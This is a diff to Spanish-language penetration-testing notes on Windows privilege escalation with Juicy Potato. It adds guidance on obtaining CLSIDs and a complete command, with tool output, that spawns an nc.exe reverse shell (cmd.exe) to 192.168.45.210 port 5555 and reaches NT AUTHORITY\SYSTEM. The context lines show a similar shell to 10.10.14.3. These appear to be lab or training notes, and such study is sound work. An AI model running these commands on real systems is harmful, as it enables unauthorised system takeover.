@@ -34,6 +34,18 @@
         - `-p c:\windows\system32\cmd.exe` es la ruta de la binary que se va a ejecutar.
         - `-a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe"` es la argumento que se va a pasar a la binary que se va a ejecutar.
         - `-t *` es el token de servicio que se va a utilizar.
+- Es importante tener en cuenta los [CLSID](https://github.com/ohpe/juicy-potato/tree/master/CLSID), para extraerlos de la maquina podemos usar [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1)
+    - Entonces por ejemplo tenemos el siguiente comando: `.\Juicy.Potato.x86.exe -l 53375 -p c:\Windows\System32\cmd.exe -a "/c c:\wamp\www\nc.exe 192.168.45.210 5555 -e cmd.exe" -t * -c {C49E32C6-BC8B-11d2-85D4-00105A1F8304}`
+- Este CLSID es del proceso winmgmt dentro de windows server 2008 R2 Enterprise
+```powershell
+C:\wamp\www>.\Juicy.Potato.x86.exe -l 53375 -p c:\Windows\System32\cmd.exe -a "/c c:\wamp\www\nc.exe 192.168.45.210 5555 -e cmd.exe" -t * -c {C49E32C6-BC8B-11d2-85D4-00105A1F8304}
+Testing {C49E32C6-BC8B-11d2-85D4-00105A1F8304} 53375
+....
+[+] authresult 0
+{C49E32C6-BC8B-11d2-85D4-00105A1F8304};NT AUTHORITY\SYSTEM
+
+``` 
+
 
 ### GodPotato
 - Afecta a versiones modernas si tenemos el privilegio SeImpersonatePrivilege.
